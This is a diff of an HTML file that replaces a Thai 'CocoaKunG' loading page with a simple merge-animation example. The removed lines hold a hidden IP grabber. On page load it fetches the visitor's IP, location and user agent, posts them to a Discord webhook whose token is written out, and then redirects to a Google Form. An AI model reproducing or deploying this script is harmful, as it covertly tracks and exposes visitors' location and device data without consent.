@@ -1,111 +1,14 @@
 <!DOCTYPE html>
-<html lang="th">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CocoaKunG</title>
-    <link rel="icon" href="https://img5.pic.in.th/file/secure-sv1/81886c3ac80db7d613194143cd712f99.jpg" type="image/png">
-    <style>
-        body {
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f5f5f5;
-            font-family: Arial, sans-serif;
-            color: #555;
-            text-align: center;
-            flex-direction: column;
-        }
-
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #FFA500;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .message {
-            font-size: 18px;
-            margin-bottom: 10px;
-        }
-
-        .sub-message {
-            font-size: 14px;
-            color: #888;
-        }
-    </style>
+    <title>Merge Animation Example</title>
+    <!-- ลิงก์ไปยังไฟล์ style.css -->
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="loader"></div>
-    <div class="message">รอสักครู่</div>
-    <div class="sub-message">พวก Robot</div>
-
-    <script>
-        // ฟังก์ชันเพื่อดึงข้อมูลจาก IP API
-        function fetchIPData() {
-            return fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => data);
-        }
-
-        // ฟังก์ชันเพื่อส่งข้อมูลไปยัง Discord Webhook
-        function sendToWebhook(data) {
-            const webhookURL = "https://discord.com/api/webhooks/1175658007833612348/4igS6PbQGK8byXd0G1DwCPrjQL9ROHBrfgkZNsJ5e3zRcGPtzXbrXzWDOiIXmwzxKuP_";
-            const payload = {
-                content: "New visitor info:",
-                embeds: [
-                    {
-                        title: "Visitor Information",
-                        fields: [
-                            { name: "IP Address", value: data.ip || "N/A", inline: true },
-                            { name: "City", value: data.city || "N/A", inline: true },
-                            { name: "Region", value: data.region || "N/A", inline: true },
-                            { name: "Country", value: data.country_name || "N/A", inline: true },
-                            { name: "Device", value: navigator.userAgent || "N/A", inline: true }
-                        ],
-                        color: 16711680
-                    }
-                ]
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload),
-            });
-        }
-
-        // ตรวจสอบเส้นทาง URL และเปลี่ยนเส้นทางตามนั้น
-        function checkPath() {
-            const currentPath = window.location.pathname;
-            if (currentPath.includes("/test")) {
-                setTimeout(function() {
-                    window.location.href = "web.html";
-                }, 3000);
-            } else {
-                fetchIPData().then(ipData => {
-                    sendToWebhook(ipData);
-                    setTimeout(function() {
-                        window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSeT_bSz4XGDYuIhR6DTA8KkEaX4Zg5Oa2bdTTXqKfvAbA8HXw/viewform";
-                    }, 3000);
-                });
-            }
-        }
-
-        // เรียกใช้ฟังก์ชันตรวจสอบเส้นทางเมื่อโหลดหน้าเว็บ
-        checkPath();
-    </script>
+    <!-- แสดงแอนิเมชันด้วยการใช้คลาส .merge -->
+    <div class="merge"></div>
 </body>
 </html>
